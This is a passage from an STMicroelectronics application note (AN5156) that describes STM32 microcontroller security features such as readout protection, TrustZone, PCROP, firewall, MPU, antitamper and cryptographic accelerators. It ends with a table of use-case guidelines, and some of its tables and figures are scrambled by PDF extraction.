sectors

Backup
SRAM

By sectors
(16 K,
64 K,
128 K, or
256 Kbytes
)

RDP four
levels,
backup
registers,
SRAM2

Up to four
protected
areas with
2‑K or
4‑Kbyte
granularity

SRAM2,
with
1‑Kbyte
granularity

No
(replaced
by
TrustZone)

Up to two
secure
hide areas
(HDP)
inside the
TrustZone
secure
domain

No
(replaced
by
TrustZone)

RDP additional
protection

Flash WRP

SRAM WRP

PCROP

HDP

Firewall

MPU

OTP

UBE(1)

Internal tamper
detection

Hardware crypto(2)

No

SRAM2, with 1‑Kbyte granularity

No

No

No

No

No

No

Yes, with
second
stage
extension

No

No
(replaced
by
TrustZone)

Up to two
secure
hide areas
(HDP)
inside the
TrustZone
secure
domain

No
(replaced
by
TrustZone)

No

No
(replaced
by
TrustZone)

No

By area
with
256‑byte
granularity

By area with 256‑byte
granularity, one area per
bank

By sectors

3‑stage temporal isolation, one per
bank

Yes (secure user memory, with
256‑byte granularity)

No

No

No
(replaced
by
TrustZone)

No

No

No

No

No

Yes

Yes

Yes

Yes

Yes

Yes

512 bytes

1 Kbyte

512 bytes

2 Kbytes

1 Kbyte

Yes

No

Yes

No

Yes

No

Yes (boot lock feature)

Yes

Yes

Yes (boot
lock
feature)

Yes (unique entry point in secure
access)

Yes

No

No

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

AES,
HASH,
PKA

AES

AES,
HASH,
PKA

HASH

AES,
HASH,
OTFDEC,
PKA

AES,
HASH,
PKA

RNG

e
r
a
w

t
f

o
s
e
r
u
c
e
S

SBSFU

TF-M

No

Yes

Yes

No

No

Yes

No

No

No

Yes

SP 800‑90‑B

KMS

No

No

No

No

Yes

Yes

-

-

AES, DES, HASH, OTFDEC

AES,
HASH

SP800‑90‑
A(3)

SP
800‑90‑B

SP800‑90‑
A(3)

Yes

No

Yes

No

Yes

No

Yes

No

No

No

No

No

AN5156 - Rev 10

page 30/59

AN5156
STM32 security features

1. Unique boot entry.

2. For most devices with hardware crypto capability, there is a direct equivalent without it.

3. RNG v2.0, can be used as a seed source for DRBG.

6.2

Readout protection (RDP)
The readout protection is a global flash memory protection allowing the embedded firmware code to be protected
against copy, reverse engineering, dumping, using debug tools, or code injection in SRAM. The user must set
this protection after the binary code is loaded to the embedded flash memory.
The RDP applies to all STM32 devices for:

•
•

the main flash memory
the option bytes (level 2 only)

Depending on the STM32 device, additional protections are available, including:

•
•
•

backup registers for real-time clock (RTC)
backup SRAM
Nonvolatile memories

Figure 8. Example of RDP protections (STM32L4 series)

Debug port

i

r
e
g
s
t
e
r
s

B
a
c
k
u
p

FLASH

SRAM1
SRAM2

R
e
g

B
a
c
k
u
p

FLASH

SRAM
SRAM1

R
e
g

B
a
c
k
u
p

FLASH

SRAM
SRAM

Level 0

Level 1

Level 2

1
V
2
5
9
0
5
T
D

The RDP levels are defined as follows:

•

•

•

Level 0(default RDP level)
The flash memory is fully open, and all memory operations are possible in all boot configurations (debug
features, boot from RAM, boot from system memory bootloader, boot from flash memory). There is no
protection in this configuration mode that is appropriate only for development and debug.
Level 1
Flash memory accesses (read, erase, program), or SRAM2 accesses via debug features (such as serial-
wire or JTAG) are forbidden, even while booting from SRAM or system memory bootloader. In these cases,
any read request to the protected region generates a bus error.
However, when booting from flash memory, accesses to both flash memory and to SRAM2 (from user
code) are allowed.
Level 2
All protections provided in Level 1 are active, and the MCU is fully protected. The RDP option byte and all
other option bytes are frozen, and can no longer be modified. The JTAG, SWV (single-wire viewer), ETM,
and boundary scan are all disabled.

A fourth RDP level is available for devices built on Armv8 architecture:

•

Level 0.5(for nonsecure debug only)
All read and write operations (if no write protection is set) from/to the nonsecure flash memory are possible.
The debug access to secure area is prohibited. Debug access to nonsecure area remains possible.

AN5156 - Rev 10

page 31/59

AN5156
STM32 security features

RDP level regression

RDP can always be leveled up. A level regression is possible with the following consequences:

•

•

•

Regression from RDP level 1 to RDP level 0 leads to a flash memory mass erase, and the erase of SRAM2
and backup registers.
Regression from RDP level 1 to RDP level 0.5 leads to a partial flash memory erase: only the nonsecure
part is erased.
Regression from RDP level 0.5 to RDP level 0 leads to a flash memory mass erase, and the erase of
SRAM2 and backup registers.

In RDP level 2, with exception of preconfigured OEM keys in STM32Ux series, no regression is possible.

Internal flash memory content updating on an RDP protected STM32 MCU

In RDP level 1 or 2, the flash memory content can no longer be modified with an external access (bootloader or
booting from SRAM). However, modifications by an internal application are always possible. Practical
implementations of such firmware updates are SFU (secure firmware update) and IAP
(in‑application‑programming). See examples in related documents AN4657, AN5056, AN5544, and AN5447 to
learn more.

Regression locked by OEM keys

The STM32U0 and STM32U5 series introduce the possibility to define secret keys (passwords) to allow controlled
regression (for example for fault analysis purposes). The keys are programmed in similar way as a regular option
byte, and to allow regression, they need to be presented to the debug interface in a dedicated connection mode,
which prevents concurrent connection for normal debug session.
There are separate keys for regression from RDP2 and from RDP1.
Regression is supported in the STM32CubeProgrammer utility both in GUI and CLI.

The table below summarizes the RDP protections.

Table 13. RDP protections

Area

RDP
level

Boot from user flash
memory

Debug or boot from SRAM or from bootloader

Read

Write

Erase

Read

Write

Erase

Flash main memory

System memory

Option bytes

Other protected assets (1)

1. Backup registers/SRAM

0

1

2

0

1

2

0

1

2

0

1

2

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

Yes

No

No

No

Yes

Yes

No

Yes

Yes

Yes

Yes

Yes

Yes

No

No

No

Yes

Yes

No

Yes

N/A

N/A

Yes

No

N/A

Yes

No

N/A

Yes

Yes

N/A

Yes

No

N/A

Yes

No

N/A

No

No

N/A

Yes

Yes

N/A

Yes

No

N/A

Yes

No

N/A

No

No

N/A

Yes

Yes

N/A

Yes

No

N/A

When to use the RDP

On a consumer product, the RDP must always be set at least at level 1. This prevents basic attacks through
the debug port or through the bootloader. However, in RDP level 1, there is a risk of service denial caused by a
flash memory mass erase, following a return to RDP level 0.

AN5156 - Rev 10

page 32/59

AN5156
STM32 security features

The RDP level 2 is mandatory to implement an application with higher security level (such as immutable code).
The drawback is that the RDP level 2 can prevent a device examination, for instance after a customer return.
The RDP level 0.5 is used to debug a nonsecure application, while protecting contents within secure area
boundaries from debug access. Refer to section 'Development recommendations using TrustZone®' of the
application note Arm® TrustZone® features on STM32L5 and STM32U5 series (AN5347) for more information
about this protection.

The RDP is available on all STM32 device, unless succeeded by the lifecycle management product state (see
Section 6.3).

Lifecycle management–product state
The addition of RDP 0.5 into the RDP mechanism used by the STM32 enabled the necessary isolation between
secure and nonsecure development. However, the RDP does not allow going further in the user experience with
the adoption of new development and OEM manufacturing models. The RDP has been replaced by the product
state, a more refined lifecycle management system, on the STM32H5 devices as a pilot project. The product state
is also an answer to the needs of customers requesting a state that is effectively an RDP2 to the outside world
and it allows them to perform a regression in the controlled environment. A similar provision was also added to
the STM32U5 series, but the product state enabled finer control over delegating the debugging rights in
TrustZone enabled products. It is sufficient for microcontrollers with no TrustZone isolation to use only two states,
open and closed, for example, the STM32H7Rx/7Sx which implements the product state this way.
The new lifecycle management defines a set of permitted states, and the possible transition between them, just
as in the case of the RDP, but there are more states defined for the following:

•
•
•
•

Provision with immutable root of trust code.
Clear separation of nonsecure and secure environment.
Use certificates for controlled regression.
Use certificates for temporary debug sessions.

For applications that do not need these new options, there are still product states corresponding to the original
RDP values.
The main available product states are:

•
•
•
•
•
•

Open: roughly equivalent to RDP 0
Provisioning: marks an ongoing installation of iRoT
iRoT-provisioned: roughly comparable to RDP 0.5
TZ-closed: state in which debugging of nonsecure code is permitted
Closed: equivalent of RDP2, but the regression is possible (only with a valid authorization)
Locked: final state with no possibility of further transition (like RDP2)

Unique boot entry
If the secure boot firmware is located in the user flash, it is important to prevent the attacker from diverting the
boot sequence from the intended progression. This is the goal of the unique boot entry or BOOT_LOCK.
The RDP2 on some products prevent booting from other memory. The BOOT_LOCK goes further by also working
in RDP1 and working with the product state life-cycle management. In some devices the BOOT_LOCK allows the
possibility to lock the boot to a specific address.
Even if RDP2 is set; the unique boot entry provides additional security assurance against glitch attacks.
A unique boot entry is available on STM32Ux, STM32Gx, STM32Hx, STM32Cx series, and in STM32WBA
wireless devices. Implementation details are available in each device reference manual, on the sections about
boot configuration and flash.

One-time programmable (OTP)
The OTP is a dedicated, isolated area in the flash memory, which can be only written on or locked out, preventing
any modification. It is usually a smaller area compared to the size of the user flash memory.
This feature is very useful for lifecycle management, provisioning, personalization, or configuration. Once the OTP
is written, there is no method of erasing data without physically damaging the device. No restriction is implicitly
put on reading written data.

Note:

6.3

6.4

6.5

Note:

The OTP is available on most STM32 devices (refer to Section 2: Overview for more details).

AN5156 - Rev 10

page 33/59

AN5156
STM32 security features

6.6

TrustZone®
This section describes the main features of the TrustZone® architecture. For further information, refer to the
application note Arm® TrustZone® features on STM32L5 and STM32U5 series (AN5347), and to the device
reference manual.
The Armv8-M TrustZone® architecture defines two domains at system level: secure and nonsecure. The full
memory-map space is split into secure and nonsecure areas. This includes all memory types (flash memory,
SRAM, and external memories), as well as all peripherals that can be shared (with specific context for each
domain) or dedicated to one domain or the other.
At system level, the isolation between secure and nonsecure domains relies on the following hardware
mechanisms (see Figure 9):

•

•
•
•

specific core architecture (Armv8-M Cortex-M33) with a dual execution domain for secure and nonsecure
domains, and an implementation defined attribution unit (IDAU) to assert address range security status
secure attribution unit (SAU) is used to refine settings of the IDAU
bus infrastructure that propagates the secure and privilege attributes of any transaction (AHB5)
dedicated hardware blocks managing the split between the two domains (GTZC to define security attribute
for internal SRAMs and external FSMC/OCTOSPI memories, and peripherals)

Figure 9. TrustZone® implementation at system level

Armv8-M
Cortex-M33
SAU/MPU

AHB master

AHB5

AHB peripherals

MPCBB

GTZC

AHB/APB
bridge

APB
peripheral

B
P
A

TrustZone specific implementation

MPCWM

Secure
watermarks and
block based

Flash
memory

Internal
SRAM

External
memory

1
V
8
8
6
3
6
T
D

6.6.1

6.6.2

Core state
The core state depends on the region of the current running code. When the code runs from a secure region,
the core is in secure state. Otherwise, the core is in nonsecure state.

Secure attribution unit (SAU)
The SAU is a hardware unit coupled to the core (as the MPU). The SAU is responsible for setting the security
attribute of the AHB5 transaction. The security attribute of a transaction is fixed by the targeted address of
a memory-mapped resource (memory areas or peripherals). Depending on the SAU configuration, an address is
tagged as secure, nonsecure callable (NSC), or nonsecure. The NSC is a subdomain of the secure domain, that
allows a gateway to be defined for nonsecure code to access the secure domain at a specific entry point.
The SAU is configurable by secure firmware. It can be configured at boot for a fixed configuration, or can be
dynamically modified by a secure firmware.

AN5156 - Rev 10

page 34/59

Note:

6.6.3

Note:

6.7

AN5156
STM32 security features

A security attribute cannot be modified to be less secure (by security order: secure > NSC > nonsecure) than a
default attribute set by hardware through an IDAU (implementation defined secure attribute).
Refer to implementation details of each device in the reference manual.
Address aliasing
The security attribute is set depending on the fixed resource address. However, a memory‑mapped resource can
be set either as secure or nonsecure, depending on the application. To overcome this apparent contradiction,
two addresses are assigned to each memory-mapped resource: one used when the resource must be accessed
in secure mode, one used in nonsecure mode. This mechanism is called address aliasing.
The address aliasing allows also all peripheral accesses to be grouped in only two regions instead of multiple
scattered regions. Finally, the IDAU splits the memory-mapped resources in the following regions:

•
•
•

peripherals secure/nonsecure regions
flash memory secure/nonsecure regions
SRAM secure/nonsecure regions

Refer to device reference manual for the detailed configuration.

Memory and peripheral protections
The SAU defines the transaction security attribute, and the bus infrastructure propagates this attribute towards the
targets. The targets (memories and peripherals) are protected by hardware mechanisms that filter the access
depending on the secure and privileged attributes.
There are two types of peripherals in the TrustZone® system architecture:

•

•

TrustZone-aware peripherals: connected directly to the AHB or APB bus, with a specific TrustZone®
behavior such as a subset of secure registers. The access filtering control is included in these peripherals
Securable peripherals: protected by an AHB/APB firewall gate controlled by the GTZC to define
security properties

TrustZone-aware peripherals are the ones with a bus master role (DMAs), the GTZC, the flash memory controller,
and others peripherals with a fundamental role within the system (PWR, RTC, system configuration).
The remaining system peripherals are securable.
The GTZC defines the access state of securable peripherals, embedded SRAM, and external memories:

•
•
•

•

Peripherals can be set as secure or nonsecure (exclusively), privileged or unprivileged using TZSC.
Embedded SRAM is protected by blocks of 256 bytes through the MPCBB.
External memories are protected by regions (watermark: start and length). The number of protected
regions depends on the memory types (NAND, NOR, or OCTOSPI).
Illegal access events lead to secure interrupts generated by TZIC.

The flash memory security attribute is defined through secure watermark option bytes, and/or flash memory
interface block-based registers.

Flash memory write protection (WRP)
The write protection feature is used to protect the content of the specified memory area against erase or update.
For flash memory technology, an update must be considered as filling with zeros.
For instance, the write protection can be set on a page or a sector of a flash memory to prevent its alteration
during a firmware or data update. It can also be set by default on the unused memory area to prevent
any malware injection. Its granularity is linked to the page or sector size.
When to use the WRP
This protection must be used, in particular when write operations are foreseen within the application. This is
the case if data storage or code update operations are expected. The WRP prevents wrong accesses due to
unsafe functions causing unexpected overflows.

Note:

The WRP is available on all STM32 devices.

6.8

Execute-only firmware (PCROP)
Part of the STM32 flash memory can be configured with an 'execute-only' attribute. The firmware stored in such
configured area can only be fetched by the CPU instruction bus. Any attempt to read or write this area is
forbidden. The protection applies against both internal (firmware) accesses as well as external (debug port)
accesses. In an STM32 device, this feature is named proprietary code readout protection (PCROP).

AN5156 - Rev 10

page 35/59

AN5156
STM32 security features

Note:

6.9

The PCROP is a static protection set by option bytes. The number of protected areas and their granularity
depends on the STM32 device (see Section 6.1.2: Security features by STM32 devices). When the PCROP is in
use, care must be taken to compile the firmware with the execute-only attribute (refer to user compiler options).
Refer to the document [3] for more details.
In particular, the ARMv6-M instruction set has difficulty working with this constraint. The compiler must be set not
to place constants and literal pools within the program, otherwise even the code execution can eventually trigger
the protection.
When to use the PCROP
The PCROP is used to protect third-party firmware (intellectual property), as well as the most sensitive parts of
the user firmware.

The PCROP is available on all STM32 devices listed in Table 1, except on TrustZone-enabled devices, where it
is superseded by another protection mechanism.

Secure hide protection (HDP)
Some STM32 devices support the HDP memory concept. The HDP, named secure hide protection on STM32L5
devices, is also known as secure user memory on STM32H7 devices, or securable memory on STM32G0
devices.
An HDP area is a part of the user flash memory that can be accessed only once, just after a device reset. The
HDP targets sensitive applications that embed or manipulate confidential data, and that must be securely
executed at boot. Once the transition is executed, the HDP area is closed, and cannot be accessed anymore by
any means (see the figure below).
The code that facilitates the HDP transition is usually an STMicroelectronics code located in the RSS. Code in
SRAM is an alternative.

Figure 10. HDP protected firmware access

Reset

Secure firmware execution
HDP area access enabled

Jumper code transition

Main application execution
HDP area access disabled

Flash memory

HDP area

R/W/E
access allowed

s

s

e

c

c

o   a

N

2
V
3
5
9
0
5
T
D

The HDP is a static protection configured by option bytes. Once set, the CPU boots on the firmware embedded
in this area, independent of the boot configuration set by boot pin or boot address. HDP can be single stage or
use a monotonic counter to gradually cover more memory as the secure boot progresses (STM32H5). Some
devices implement a dynamic HDP expansion. This means that the HDP can be extended by the number of
sectors using the register value, without programming the OB (STM32H5, STM32U0).
When to use the HDP
The HDP is suited for a code that must only be executed after reset, like secure boot for root of trust. It should be
used in synergy with the boot lock feature.

Note:

The HDP is available in STM32H7, STM32G0, STM32G4, STM32L5, STM32U0, STM32U5, and STM32H5
devices, with slight differences in its implementation and name (refer to the reference manuals for details).

AN5156 - Rev 10

page 36/59

AN5156
STM32 security features

6.10

Firewall
The firewall is a hardware protection peripheral controlling the bus transactions and filtering accesses to three
particular areas: a code area (flash memory), a volatile data area (SRAM) and a nonvolatile data area (flash
memory). The protected code is accessible through a single entry point (the call-gate mechanism explained
below). Any attempt to jump and try to execute any of the functions included in the code section without passing
through the entry point, generates a system reset.
The firewall is part of the dynamic protections. It must be set at startup (for example by an SB application).

Call gate mechanism

The firewall is opened by calling a 'call-gate' mechanism: a single entry point that must be used to open the gate,
and to execute the code protected by the firewall. If the protected code is accessed without passing through
the call gate mechanism, then a system reset is generated. If any instruction is fetched outside the protected
area, the firewall is closed (see the figure below).

Figure 11. Firewall FSM

IDLE

Firewall
enabled

Reset

CLOSED

Call gate

Instruction fetch
out of prot. area

Reset

OPEN

1
V
4
5
9
0
5
T
D

Since the only way to respect the call gate sequence is to pass through the single call gate entry point,
a mechanism must be provided in order to support application calling multiple firewall-protected functions from
unprotected code area (such as encrypt and decrypt functions). A parameter can be used to specify which
function to execute (such as CallGate(F1_ID) or CallGate(F2_ID)). According to the parameter, the right
function is internally called. This mechanism is represented in the figure below.

AN5156 - Rev 10

page 37/59

AN5156
STM32 security features

Figure 12. Firewall application example

unprotected_code.c

Function ID

Call gate single entry point

Firewall code section

When to use the firewall

f1()

f2()

f3()

f1a()

f2a()

f3a()

f1b()

f2b()

f3b()

1
V
1
6
9
0
5
T
D

Note:

6.11

The firewall protects both code and data. The protected code can always be called as long as a call gate
mechanism is respected.

A firewall is available on STM32L0 and STM32L4 devices only. Refer to the application note AN4730 for more
details. The firewall functionality is replaced by TrustZone.

Memory protection unit (MPU)
The MPU is a memory protection mechanism that allows specific access rights to be defined for
any memory‑mapped resource of the device: flash memory, SRAM, and peripheral registers. This protection is
dynamically managed at runtime.

Note:

MPU attributes are only set for CPU access. Other bus master requests (such as DMA) are not filtered
by the MPU, and must be deactivated if they are not needed.

Region access attributes

The MPU splits the memory map into several regions, each having its own access attribute. Access right can be
set as executable, not executable(XN), read-write (RW), read only (RO), or no access.

Note:

There are other attributes set by the MPU for each region: shareable, cacheable, and bufferable. This
application note does not cover the whole complexity of the MPU. This section provides only an introduction and
high‑level overview. Refer to applicable programming manual, or to the document [5].

Privileged and unprivileged modes

On top of the access attribute, the Arm Cortex-M architecture defines two execution modes, allowing a process
to run in either privileged or unprivileged mode. For each region, the access attribute can be set independently
for each mode.

AN5156 - Rev 10

page 38/59

AN5156
STM32 security features

The table below shows the different cases supported by mixing modes and access attributes.

Table 14. Attributes and access permission managed by MPU

Privileged mode attribute Unprivileged mode attribute

Description

Execute never (XN)(1)

Code execution attribute

No access

RW

RW

RW

RO

RO

No access

No access

RO

RW

All accesses generate a permission fault.

Access from a privileged software only

Written by an unprivileged software generate a permission fault.

Full access

No access

Read by a privileged software only

RO

Read only, by privileged or unprivileged software

1. XN attribute is set by region, and is valid for both modes. It can be used to avoid SRAM code injection for example.

The code executed in privileged mode can access additional specific instructions (MRS), and can also access
Arm® core peripheral registers (such as NVIC, DWT, or SBC). This is useful for OS kernels or pieces of secure
code requiring access to sensitive resources that are otherwise inaccessible to unprivileged firmware.

Secure process isolation strategy

At reset, the privileged mode is the default one for any process. The SB application is then executed in privileged
mode. The idea is to isolate secure processes (such as SB, OS kernel, key manager, or SFU) from unsecured or
untrusted processes (user applications).

Table 15. Process isolation

Firmware type

Mode

Resources access

Secure firmware (such as SB or OS kernel)

Privileged

Full access

All remaining firmware

Unprivileged MPU controlled access: no access, RO, RW

An OS kernel can manipulate MPU attributes dynamically to grant access to specific resources depending on
the currently running task. Access right can be updated each time the OS switches from one task to another.

When to use the MPU
The MPU is used at runtime to isolate sensitive code, and/or to manage access to resources depending on
the process currently executed by the device. This feature is useful especially for advanced embedded operating
systems that incorporate security in their design.

The MPU is available on all STM32 devices except the STM32F0 (see the various programming manuals for
more details).

Customer key storage (CKS)
STM32WB series are dual-core devices with one core (CPU1) for user application, and another core (CPU2)
dedicated to the wireless real-time aspect execution (either Bluetooth® Low Energy, ZigBee, or thread protocols).
The flash memory used by CPU2 is isolated from the CPU1 or external access. Communication between the two
cores is ensured by a mailbox and an interprocess channel control hardware block (IPCC).
In addition to the wireless stack execution, the CPU2 offers a secure storage service for cryptographic keys used
with a dedicated AES hardware peripheral (see Figure 13). The AES key register is accessible only to the CPU2,
preventing access to the key by an untrusted process running on the CPU1, or by the debug port.
After the keys have been provisioned inside the secure area, the user application can use them by calling a
secure load service with an index referencing the key and no more the key itself.

Note:

6.12

AN5156 - Rev 10

page 39/59

Figure 13. Dual-core architecture with CKS service

AN5156
STM32 security features

Wireless stack

CKS
Key 0

Key 1

Key n

IPCC and mailbox

User application

CPU2

CPU1

AES hardware

Secure key
register

Data register

1
V
8
6
1
1
6
T
D

When to use the CKS
The CKS must be used when a user application relies on AES encryption or decryption. Provisioned keys can be
stored in a secure area, so that no other internal process or external access can read their value.

Note:

The CKS is available on STM32WB series only.

6.13

Note:

6.14

Antitamper (TAMP)/backup registers (BKP)
The antitamper is a system level protection, used to detect physical tampering attempts on the system.
An external tamper event is detected by a level transition on dedicated device pins. Internal tamper sensors can
check voltage, temperature, or clock. This event can be used to wake up the core in order to take appropriate
actions (such as memory erase or alarm).
This TAMP peripheral includes backup registers with contents preserved by VBAT, along with the real-time clock
(RTC). These registers can be reset if a tamper attempt is detected.
On some STM32 devices, this peripheral is known as backup registers (BKP). On recent devices, it has evolved
with additional features, such as monotonic counter, or secure section for TrustZone® secure area.
When to use the antitamper
It must be used for system intrusion detection (in consumer products sealed enclosures for example).
The monotonic counter is a countermeasure against tampering with the RTC.

The external tamper detection is available on all STM32 devices. More information about tamper functionality
usage is available, for example, in AN4759.

Clock security system (CSS)
The CSS is designed to detect a failure of an external clock source (a crystal for example). A loss of clock source
is intentional or not. In any case, the device must take appropriate actions to recover. The CSS triggers an
interrupt to the core in such event.
If the external clock source drives the main system clock, the CSS switches the system to an internal clock
source.
When to use the CSS
The CSS must be used when an external clock is used.

Note:

The CSS is available on all STM32 devices.

6.15

Power monitoring (PVD)
Some attacks target the MCU power supply to cause errors that lead to a failure of security countermeasures. A
loss of power supply sometimes denotes an attempt to freeze the device state in order to access the internal
memory content.
The STM32 devices embed a programmable voltage detector (PVD) that can detect a drop of power. The PVD
allows the configuration of a minimum voltage threshold, below which an interrupt is generated, so that
appropriate actions are implemented.

AN5156 - Rev 10

page 40/59

AN5156
STM32 security features

When to use the PVD
The PVD must be used as soon as a sensitive application runs, and is likely to leave some confidential data in the
working memory (SRAM). A memory cleaning can be launched in case of power down detection.

Note:

The PVD is available on all STM32 devices.

6.16

Memory integrity hardware check
The error code correction (ECC) and parity checks are safety bits associated to the memory content:

Note:

6.17

•

•

The ECC is associated to the memory words, used to recover from a single-bit error, or to detect up to two
erroneous bits on each flash memory or SRAM word (32- to 256-bit word depending on the memory type).
Refer to the AN5342 for more details.
A simple parity check allows the detection of a single error bit on the SRAM words where ECC is not
implemented.

When to use ECC and parity check
ECC and parity checks are mostly used for safety reasons. The ECC can also be used to prevent some invasive
hardware attacks.

This integrity protection is available on all devices except STM32F1 and STM32L1. STM32H7 devices are
champion in ECC protection.

Independent watchdog (IWDG)
The IDWG is a free running down counter that can be used to trigger a system reset when the counter reaches a
given timeout value. The IDWG can be used to provide a solution in case of malfunctions or deadlock in running
code. The IDWG is clocked by its own independent low-speed clock (LSI), so that it stays active even in the event
of a main clock failure.
When to use the IWDG
The IWDG can be used to break deadlocks. It can also be used to control execution time of critical code (such as
decryption or flash memory programming).

Note:

The IDWG is available on all STM32 devices.

6.18

6.19

Device ID
Each STM32 device has a unique 96-bit identifier providing an individual reference for any device in any context.
These bits can never be altered by the user.
The unique device identifier can be used for direct device authentication, or for instance to derive a unique key
from a master OEM key.

Cryptography
As described in Section 5, cryptography is essential to secure an embedded system. The cryptography enables
confidentiality, integrity, and authentication of data or code. For efficiently supporting these functions, most STM32
series include products with hardware cryptography peripherals. These peripherals allow cryptographic
computations (such as hashing or symmetric algorithms) to be accelerated. For devices with no such specific
hardware acceleration, the STM32 cryptographic firmware library (CryptoLib) provides a software implementation
of a large set of cryptographic algorithms.
The cryptography related features for each product can be identified via their root part number, specifically on the
second number or letter after the series identifier. For example the STM32L486 and STM32H7B3 devices have
crypto hardware while the STM32L476 and STM32H7A3 have to use software library to implement cryptography,
and it can be known by their naming.

AN5156 - Rev 10

page 41/59

6.19.1

Hardware accelerators
The following cryptographic peripherals are available in STM32 devices:

AN5156
STM32 security features

•

•

•

•

TRNG (true random generator)

–

hardware-based peripheral providing a physical noise source. Used to feed a DRNG with a seed, or
directly for random numbers, depending on device.
Note: For details about the RNG validation, refer to the application note 'STM32 microcontroller
random number generation validation using the NIST statistical test suite' (AN4230).

AES accelerator

–
–
–
–

encryption/decryption
128- or 256‑bit keys
several modes of operation (such as ECB, CBC, CTR, or GCM)
DMA support

Note: When the AES is used for encryption or decryption, the access to its registers containing the key
must be protected and cleaned after use (the MPU can be configured to restrict access to memory with
keys).
PKA accelerator

–

acceleration of RSA, DH, and ECC over GF(p) operations, based on the Montgomery method for fast
modular multiplications
built-in Montgomery domain inward and outward transformation

–
HASH accelerator

–
–
–

MD5, SHA1, SHA224, SHA256
FIPS compliant (FIPS Pub 180-2)
DMA support

Note:

6.19.2

6.20

Many low-power STM32 devices feature hardware cryptography accelerators. The amount of energy needed to
complete cryptographic computations with them is lower than the amount of energy required to treat them via
software processing.

CryptoLib software library
The STM32 X-CUBE-CRYPTOLIB software library runs on all STM32 devices. It is available for free download at
www.st.com/en/product/x-cube-cryptolib. The version V4 is available with full firmware implementation, compiled
for Cortex‑M0, Cortex‑M0+, Cortex‑M3, Cortex‑M33, Cortex‑M4, and Cortex‑M7.
The X-CUBE-CRYPTOLIB supports the following algorithms:

•
•
•
•
•
•

DES, 3DES with ECB and CBC
AES with ECB, CBC, OFB, CCM, GCM, CMAC, KEY wrap, XTS
Hash functions: MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-512
Other: ARC4, ChaCha20, Poly1305, Chacha20-Poly1305
RSA signature with PKCS#1v1.5
ECC with key generation, scalar multiplication (basis of ECDH) and ECDSA + ED25519 and Curve 25519

On-the-fly decryption engine (OTFDEC)
The external memory content (code and data) cannot be protected with traditional read/write protections. The way
to protect the content is to encrypt and decrypt it inside the device before using it.
One solution is to download the external memory content inside the SRAM, to decrypt it, to execute the code,
and/or to use data. There are two drawbacks with this method: it introduces a delay that may not be acceptable,
and it uses a large amount of SRAM, depending on the content.
The OTFDEC peripheral offers the possibility to decrypt the content directly with a low-latency penalty, and
without the need for SRAM allocation. The OTFDEC decrypts the on-the-fly bus traffic based on the read-request
address information. It is used with the Octo-SPI interface (see the figure below).

AN5156 - Rev 10

page 42/59

AN5156
STM32 security features

Figure 14. Typical OTFDEC configuration

Instruction
cache

data/system
cache

C
E
D
F
T
O

OCTOSPI

Device boundary

s
u
b

I

P
S

SPI NOR
flash memory

1
V
3
7
9
8
4
T
D

The OTFDEC uses the AES-128 CTR mode, with a 128-bit key to achieve a latency below 12 system bus cycles.
Up to four independent and nonoverlapping encrypted regions can be defined (4-Kbyte granularity),
each with its own key.
When to use the OTFDEC
The OTFDEC is used when an external memory is used by the system. For TrustZone® capable MCUs, the
decryption keys can only be made accessible through the secure mode. See the application note How to use
OTFDEC for encryption/decryption in trusted environment on STM32H73/H7B MCUs (AN5281) for more details.

Note:

The OTFDEC is available on STM32H5, STM35H7, STM32L5, and STM32U5 devices only.

AN5156 - Rev 10

page 43/59

AN5156
Guidelines

7

Guidelines

Secure systems can take advantage of many security supporting hardware feature. Some are useful for any
system, and need little change in the application code to be activated and fully functional. It is the case of the
RDP feature, that prevents basic access to the flash memory by disabling the debug port. Other features must be
selected depending on user application and the required security level.
This section helps defining the adapted set of security features, depending on the system use-cases. The use-
cases are gathered in four main groups: protection against external (1) and internal (2) threats, security
maintenance (3), and other use-cases related to cryptography (4) (see the table below).

1 Device protection against external threats: RDP protection, tamper detection, device monitoring

Table 16. Security use cases

1.1 Device configuration (option bytes, not supposed to be modified ever)

•

Use RDP level 2. This closes the device from any external access.

1.2 Remove debug capability for the device.

•

Use RDP level 2 for permanently disabling the debug.

1.3 Protect a device against a loss of external clock source (crystal).

•

Enable clock security system (CSS).

-

1.4 Detect a system-level intrusion.

•

Use tamper detection capability of the RTC.

1.5 Protect a device from code injection.

•
•
•
•

Use the RDP.
Isolate communication port protocol with the MPU, firewall, or HDP.
Limit communication port protocol access range.
Use write protection on empty memory areas (flash memory and SRAM).

2. Code protection against internal threats: TrustZone, PCROP, MPU, firewall, and HDP

2.1 Protect the code against cloning.

•
•
•

Use RDP level 1 or 2 against external access.
Use PCROP on most sensitive parts of the code against internal read access.
Use OTFDEC to secure code stored in the external memory.

2.2 Protect secret data from other processes.

-

•
•
•
•

Use firewall to protect both code and data.
Use MPU to protect secret data area from being read.
Use HDP in case data must only be used at reset.
Use secure domain of TrustZone, if available.

2.3 Protect code and data when not fully verified or trusted libraries are used.

•
•
•
•
•

Use PCROP to protect user most sensitive code.
Use firewall to protect user sensitive application (code, data and execution).
Use MPU and de-privilege the untrusted library.
Use IWDG to avoid any deadlock.
Use secure domain of TrustZone, if available.

3. Device security check and maintenance: integrity checks, SB, SFU

3.1 Check code integrity.

-

•
•

Hash firmware code at reset and compare to expected value.
Enable ECC on the flash memory and parity check on the SRAM.

3.2 Security checks or embedded firmware authentication

•
•

Implement SB application with cryptography.
Protect SB application secret data (refer to previous sections).

AN5156 - Rev 10

page 44/59

AN5156
Guidelines

•

Guarantee unique boot entry on SB application:

–
–

Use HDP if available.
Use RDP level 2 and disable boot pin selection.

-

3.3 Securely update the firmware in the field.

•
•

Implement a SFU application with cryptography.
Apply relevant secure memory protection around the SFU secret data (refer to previous sections).

4. Communication and authentication: cryptography

4.1 Communicate securely.

•

Use or implement secure communication stacks relying on cryptography for confidentiality and authentication
(such as TLS for Ethernet).

4.2 Use the ST AES/DES/SHA cryptographic functions with STM32 devices.

•

Use only official software implementation by ST with STM32 X-CUBE-CRYPTOLIB.

4.3 Accelerate AES/DES/SHA cryptographic functions.

•
•

Use device with cryptographic hardware peripheral together with official STM32 X-CUBE-CRYPTOLIB.
Use OTFDEC to access AES-ciphered code in the external memory without latency penalty.

4.4 Generate random data.

-

•

Use RNG embedded in the STM32 devices.

4.5 Uniquely identify ST microcontrollers.

•

Use STM32 96-bit unique ID.

4.6 Authenticate a product device.

•

Embed a shared encryption key in the device, and exchange encrypted message.

